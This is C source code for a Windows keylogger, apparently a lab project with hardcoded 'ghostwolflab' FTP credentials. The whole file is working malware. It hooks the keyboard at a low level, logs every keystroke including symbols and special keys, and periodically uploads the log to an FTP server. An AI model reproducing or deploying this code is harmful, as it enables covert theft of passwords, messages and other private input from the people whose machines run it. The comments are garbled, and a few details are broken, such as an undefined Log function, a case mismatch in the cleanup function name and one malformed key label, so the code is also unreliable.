#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <WinInet.h>
#include <ShlObj.h>

#pragma comment(lib, "WININET")

#define DEBUG

#define NAME "G"

// FTP ����
#define FTP_SERVER "127.0.0.1"
#define FTP_USERNAME "ghostwolflab"
#define FTP_PASSWORD "ghostwolflab"
#define FTP_LOG_PATH "G_Log.txt"

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define ONE_SECOND 1000
#define ONE_MINUTE ONE_SECOND * 60
#define TIMEOUT ONE_MINUTE * 1

// ȫ�־�����ҹ�
HHOOK ghHook = NULL;
// �������ȫ�־��
HANDLE ghMutex = NULL;

// ��־�ѵ�ȫ�־��
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// ��־�������ĵ�ǰ����С
DWORD dwLogBufSize = 0;

// ��ʱ�������ѵ�ȫ�־��
HANDLE ghTempHeap = NULL;
// ��ʱ��������ȫ�־��
LPSTR lpTempBuf = NULL;

// ���̶߳���
HANDLE hTempBufHasData = NULL;
HANDLE hTempBufNoData = NULL;

// �ص�����
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            DWORD dwLogBufLen = strlen(lpLogBuf);

            CHAR key[2];
            DWORD vkCode = kbd->vkCode;
            // ���� 0 - 9
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                // Shift+����
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                        case 0x30:
                            Log(")");
                            break;
                        case 0x31:
                            Log("!");
                            break;
                        case 0x32:
                            Log("@");
                            break;
                        case 0x33:
                            Log("#");
                            break;
                        case 0x34:
                            Log("$");
                            break;
                        case 0x35:
                            Log("%");
                            break;
                        case 0x36:
                            Log("^");
                            break;
                        case 0x37:
                            Log("&");
                            break;
                        case 0x38:
                            Log("*");
                            break;
                        case 0x39:
                            Log("(");
                            break;
                    }
                } else {
                    sprintf(key, "%c", vkCode);
                    Log(key);
                }
                // ���� A - Z
            } else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                //Сд a -z
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) & 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf(key, "%c", vkCode);
                Log(key);
            // ��������
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log("[CANCEL]");
                        break;
                    case VK_BACK:
                        Log("[BACKSPACE]");
                        break;
                    case VK_TAB:
                        Log("[TAB]");
                        break;
                    case VK_CLEAR:
                        Log("[CLEAR]");
                        break;
                    case VK_RETURN:
                        Log("[ENTER]");
                        break;
                    case VK_CONTROL:
                        Log("[CTRL]");
                        break;
                    case VK_MENU:
                        Log("[ALT]");
                        break;
                    case VK_PAUSE:
                        Log("[PAUSE]");
                        break;
                    case VK_CAPITAL:
                        Log("[CAPS LOCK]");
                        break;
                    case VK_ESCAPE:
                        Log("[ESC]");
                        break;
                    case VK_SPACE:
                        Log("[SPACE]");
                        break;
                    case VK_PRIOR:
                        Log("[PAGE UP]");
                        break;
                    case VK_NEXT:
                        Log("[PAGE DOWN]");
                        break;
                    case VK_END:
                        Log("[END]");
                        break;
                    case VK_HOME:
                        Log("[HOME]");
                        break;
                    case VK_LEFT:
                        Log("[LEFT ARROW]");
                        break;
                    case VK_UP:
                        Log("[UP ARROW]");
                        break;
                    case VK_RIGHT:
                        Log("[RIGHT ARROW]");
                        break;
                    case VK_DOWN:
                        Log("[DOWN ARROW]");
                        break;
                    case VK_INSERT:
                        Log("[INS]");
                        break;
                    case VK_DELETE:
                        Log("[DEL]");
                        break;
                    case VK_NUMPAD0:
                        Log("[NUMPAD 0]");
                        break;
                    case VK_NUMPAD1:
                        Log("[NUMPAD 1]");
                        break;
                    case VK_NUMPAD2:
                        Log("[NUMPAD 2]");
                        break;
                    case VK_NUMPAD3:
                        Log("[NUMPAD 3");
                        break;
                    case VK_NUMPAD4:
                        Log("[NUMPAD 4]");
                        break;
                    case VK_NUMPAD5:
                        Log("[NUMPAD 5]");
                        break;
                    case VK_NUMPAD6:
                        Log("[NUMPAD 6]");
                        break;
                    case VK_NUMPAD7:
                        Log("[NUMPAD 7]");
                        break;
                    case VK_NUMPAD8:
                        Log("[NUMPAD 8]");
                        break;
                    case VK_NUMPAD9:
                        Log("[NUMPAD 9]");
                        break;
                    case VK_MULTIPLY:
                        Log("[*]");
                        break;
                    case VK_ADD:
                        Log("[+]");
                        break;
                    case VK_SUBTRACT:
                        Log("[-]");
                        break;
                    case VK_DECIMAL:
                        Log("[.]");
                        break;
                    case VK_DIVIDE:
                        Log("[/]");
                        break;
                    case VK_F1:
                        Log("[F1]");
                        break;
                    case VK_F2:
                        Log("[F2]");
                        break;
                    case VK_F3:
                        Log("[F3]");
                        break;
                    case VK_F4:
                        Log("[F4]");
                        break;
                    case VK_F5:
                        Log("[F5]");
                        break;
                    case VK_F6:
                        Log("[F6]");
                        break;
                    case VK_F7:
                        Log("[F7]");
                        break;
                    case VK_F8:
                        Log("[F8]");
                        break;
                    case VK_F9:
                        Log("[F9]");
                        break;
                    case VK_F10:
                        Log("[F10]");
                        break;
                    case VK_F11:
                        Log("[F11]");
                        break;
                    case VK_F12:
                        Log("[F12]");
                        break;
                    case VK_NUMLOCK:
                        Log("[NUM LOCK]");
                        break;
                    case VK_SCROLL:
                        Log("[SCROLL LOCK]");
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                        break;
                }
            }


            if (dwLogBufLen == MAX_LOG_SIZE - 1)
                WaitForSingleObject(hTempBufNoData, INFINITE);
            else
                if (WaitForSingleObject(hTempBufNoData, 0) == WAIT_TIMEOUT)
                    return CallNextHookEx(0, nCode, wParam, lParam);

            strcpy(lpTempBuf, lpLogBuf);
            // �����¼�
            ResetEvent(hTempBufNoData);
            // FTP�ϴ��ź�
            SetEvent(hTempBufHasData);

            //������־��������С
            ZeroMemory(lpLogBuf, dwLogBufSize);
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
    // ����������
    ghMutex = CreateMutex(NULL, TRUE, NAME);
    if (ghMutex == NULL) {
        Fatal("create mutex");
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Fatal("mutex already exists");
        ExitProcess(1);
    }

    // ���˳�ʱ����������
    atexit(cleanUp);

    // ����������ѻ�����
    ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
    if (ghLogHeap == NULL) {
        Fatal("heap create");
    }

    lpLogBuf = (LPSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
    if (lpLogBuf == NULL) {
        Fatal("heap alloc");
    }
    dwLogBufSize = BUF_SIZ + 1;

    ghTempHeap = HeapCreate(0, dwLogBufSize, 0);
    if (ghTempHeap == NULL) {
        Fatal("temp heap create");
    }

    lpTempBuf = (LPSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBufSize);
    if (lpTempBuf == NULL) {
        Fatal("temp heap alloc");
    }

    // ���ö��߳�
    hTempBufHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
    hTempBufNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

    // ������������־���͵�FTP���������߳�
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
        Fatal("create thread");
    }

    // ���û����ҹ�
    ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (ghHook == NULL) {
        Fatal("hook failed");
    }
    // ����ѭ�����������¼
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);    
    }

    UnhookWindowsHookEx(ghHook);

    return 0;
}

// FTP����
VOID FTPSend(VOID) {
    while (TRUE) {
        // �ȴ��ϴ��������������ٷ����ź�
        Sleep(TIMEOUT);
        SetEvent(hTempBufNoData);
        WaitForSingleObject(hTempBufHasData, INFINITE);
        // ��ʼ��FTP����
        HINTERNET hINet = InternetOpen(NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_PASSIVE);
        if (hINet == NULL)
            continue;

        HINTERNET hFTP = InternetConnect(hINet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
        if (hFTP == NULL) {
            InternetCloseHandle(hINet);
            continue;
        }
        // ����FTP��������,�����ݸ��ӵ��ϴ�������
        HINTERNET hFTPFile;
        CHAR szTemp[256];
        sprintf(szTemp, "APPE %s", FTP_LOG_PATH);
        BOOL bSuccess = FtpCommand(hFTP, TRUE, FTP_TRANSFER_TYPE_ASCII, szTemp, 0, &hFTPFile);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }
        // ������д�뵽Զ���ļ�
        DWORD dwWritten = 0;
        bSuccess = InternetWriteFile(hFTPFile, lpTempBuf, strlen(lpTempBuf), &dwWritten);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }
        // �ر����Ӳ�����ѭ��
        InternetCloseHandle(hFTPFile);
        InternetCloseHandle(hFTP);
        InternetCloseHandle(hINet);
        ResetEvent(hTempBufHasData);
        //�������SetEvent(hTempBufNoData);���һֱ��������״̬
    }

    ExitThread(0);
}

// ���������Ϣ
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
    CHAR err_buf[BUF_SIZ];

    sprintf(err_buf, "%s failed: %lu", s, GetLastError());
    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

    ExitProcess(1);
}

// �˳�������
VOID CleanUp(VOID) {
    if (lpLogBuf && ghLogHeap) {
        HeapFree(ghLogHeap, 0, lpLogBuf);
        HeapDestroy(ghLogHeap);
    }
    if (ghHook) UnhookWindowsHookEx(ghHook);
    if (ghMutex) CloseHandle(ghMutex);
    if (lpTempBuf && ghTempHeap) {
        HeapFree(ghTempHeap, 0, lpTempBuf);
        HeapDestroy(ghTempHeap);
    }
}